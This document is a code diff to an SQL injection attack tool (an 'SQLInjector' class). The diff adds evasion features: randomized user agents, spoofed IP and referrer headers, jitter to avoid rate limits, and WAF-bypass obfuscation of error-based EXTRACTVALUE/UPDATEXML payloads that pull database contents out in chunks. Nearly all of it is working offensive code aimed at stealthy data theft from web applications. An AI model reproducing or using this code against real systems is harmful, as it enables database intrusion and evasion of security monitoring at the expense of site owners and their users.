@@ -33,6 +33,7 @@ SUPPORTED: MySQL (primary), PostgreSQL, MSSQL, SQLite, Oracle
 """
 import re
 import time
+import random
 import threading
 import urllib.parse
 import warnings
@@ -44,6 +45,30 @@ try:
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
+
+try:
+    from modules.evasion import (
+        random_ua, random_headers, waf_bypass_headers,
+        burst_jitter, jitter, obfuscate_sql, sql_bypass_variants,
+        inject_sql_comments, obfuscate_keywords,
+    )
+    HAS_EVASION = True
+except ImportError:
+    try:
+        from evasion import (
+            random_ua, random_headers, waf_bypass_headers,
+            burst_jitter, jitter, obfuscate_sql, sql_bypass_variants,
+            inject_sql_comments, obfuscate_keywords,
+        )
+        HAS_EVASION = True
+    except ImportError:
+        HAS_EVASION = False
+        def random_ua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        def random_headers(**kw): return {"User-Agent": random_ua()}
+        def burst_jitter(): pass
+        def jitter(*a, **kw): pass
+        def obfuscate_sql(s, level=2): return s
+        def sql_bypass_variants(p): return [("plain", p)]
 
 # ─── Constants ───────────────────────────────────────────────────────────────
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -217,13 +242,16 @@ class SQLInjector:
 
     # ── Raw request ──────────────────────────────────────────────────────────
     def _req(self, payload, param=None, method=None, extra_qs=None):
-        """Send request with payload injected into param. Returns response text."""
+        """Send request with payload injected into param — stealth headers, jitter."""
         if not self.session:
             return ""
         p = param or self.inj_param
         m = method or self.inj_method or self.method
-        hdrs = {"User-Agent": UA}
-        hdrs.update(self.extra_hdr)
+        # Build stealth headers (new random UA + IP spoof + referrer per request)
+        hdrs = random_headers(include_ip_spoof=True, include_referrer=True)
+        hdrs.update(self.extra_hdr)   # caller overrides last
+        # Jitter to avoid rate-limit triggers
+        burst_jitter()
         try:
             if m == "GET":
                 qs = dict(self._qs)
@@ -247,10 +275,10 @@ class SQLInjector:
             return ""
 
     def _req_raw(self, url, method="GET", params=None, data=None):
-        """Raw request with explicit URL/params."""
+        """Raw request with explicit URL/params — stealth headers."""
         if not self.session:
             return ""
-        hdrs = {"User-Agent": UA}
+        hdrs = random_headers(include_ip_spoof=True, include_referrer=False)
         hdrs.update(self.extra_hdr)
         try:
             if method == "GET":
@@ -523,7 +551,10 @@ class SQLInjector:
 
     # ── Error-based extraction ────────────────────────────────────────────────
     def _error_extract(self, sql_expr):
-        """Extract full string via EXTRACTVALUE/UPDATEXML — paginates with SUBSTRING"""
+        """
+        Extract full string via EXTRACTVALUE/UPDATEXML — paginates with SUBSTRING.
+        Tries obfuscated variants when plain payload returns nothing (WAF evasion).
+        """
         fn   = getattr(self, "_err_fn", "EXTRACTVALUE")
         PAGE = 30   # MySQL EXTRACTVALUE max usable chars ~ 31
 
@@ -532,12 +563,22 @@ class SQLInjector:
         while True:
             chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
             if fn == "UPDATEXML":
-                inj = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
+                inj_plain = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
             else:
-                inj = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"
+                inj_plain = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"
 
-            resp  = self._req_payload(self._wrap(inj))
-            chunk = _extract_error_value(resp)
+            chunk = None
+
+            # Try plain first, then obfuscated variants if WAF blocks
+            candidates = [inj_plain,
+                          obfuscate_sql(inj_plain, level=1),
+                          obfuscate_sql(inj_plain, level=2),
+                          inject_sql_comments(inj_plain, intensity=0.5)]
+            for inj in candidates:
+                resp  = self._req_payload(self._wrap(inj))
+                chunk = _extract_error_value(resp)
+                if chunk:
+                    break
 
             if not chunk:
                 break
